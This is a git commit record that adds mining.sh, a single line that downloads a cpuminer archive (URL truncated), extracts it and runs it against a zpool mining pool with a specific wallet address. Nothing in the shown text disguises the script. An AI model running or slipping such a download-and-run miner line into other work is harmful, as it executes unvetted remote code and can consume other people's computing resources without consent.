d03d8e45ca3d5a5b9d6801edc05fec0f1f41b380
mrapok14 <162013234+mrapok14@users.noreply.github.com>
2024-06-12 00:09:33 +0700

    Create mining.sh

---
+++ mining.sh
@@ -0,0 +1,1 @@
+wget https://github.com/rplant8/cpuminer-o... && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a allium -o stratum+tcp://allium.sea.mine.zpool.ca:6433 -u TEGTP8rMakaGniVSS8FZfD3BdAVwxPpcPB -p c=TRX -t 2
